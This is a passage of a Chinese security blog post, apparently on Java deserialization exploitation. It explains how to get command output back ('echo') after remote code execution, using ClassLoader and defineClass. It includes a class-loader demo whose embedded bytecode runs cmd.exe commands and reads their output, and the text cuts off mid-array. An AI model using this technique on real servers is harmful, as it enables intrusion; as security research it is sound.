@@ -1,0 +1,1296 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Java反序列化链回显解决方案, 像清水一般清澈透明">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Java反序列化链回显解决方案 | 像清水一般清澈透明</title>
+    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/css/my.css">
+
+    <script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.1.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="像清水一般清澈透明" type="application/atom+xml">
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">像清水一般清澈透明</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">像清水一般清澈透明</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Java反序列化链回显解决方案</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/SummerSec/SummerSec.github.io/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">Java 反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-06-01
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    17 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>   这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己颓废了一段时间导致现在才公布。之后可能会断更一段时间关于代码审计方面文章，时间暂不确定。其实有几个题材早也确定，但是实在是没时间去整理素材，加上项目的更新，让我变得更加繁忙，在此给位先说一声对不起。</p>
+<hr>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   大多数Java反序列化漏洞都能执行命令，导致RCE。小伙伴们有没有想过网络上大多数<code>payload</code>都是以弹计算机为止，但目标主机有没有弹计算机，或者执行其他的命令的时候我们是并不知道的，因为没有回显任何的结果。这篇文章以反序列化漏洞的回显为题，教你解决如何解决反序列化漏洞回显。</p>
+<p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p>
+<hr>
+<h1 id="defineclass异常回显"><a href="#defineclass异常回显" class="headerlink" title="defineclass异常回显"></a>defineclass异常回显</h1><p>   defineclass是<code>java.lang.ClassLoader</code>类下的一个类方法，将字节码转化为Class类。<br><img src="https://img-blog.csdnimg.cn/20200605103739371.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605103901837.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="ClassLoder-类加载机制"><a href="#ClassLoder-类加载机制" class="headerlink" title="ClassLoder 类加载机制"></a>ClassLoder 类加载机制</h2><p>   Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200524095720286.png" alt="在这里插入图片描述"><br>   类加载器有三个，根加载器<code>Bootstrap</code>、平台类加载器<code>PlatformClassLoader</code>以及用户类加载器<code>AppClassLoader</code>。用户也可以自定义类加载器，自定义的类加载器需要继承<code>ClassLoader</code>类。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200524110624558.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="类加载demo"><a href="#类加载demo" class="headerlink" title="类加载demo"></a>类加载demo</h2><p>   下面给出的是一个完整的用户自定义加载器加载类字节码的DEMO，Summer类字节码怎么获取下文会讲解，目前先看一下类加载器的实现。</p>
+<blockquote>
+<p>温馨提示：如果使用笔者在GitHub上项目，请先将Summer类删除，或者移到其他地方。</p>
+</blockquote>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>{</span><br><span class="line">    <span class="comment">// Summer类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.class类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]{</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span 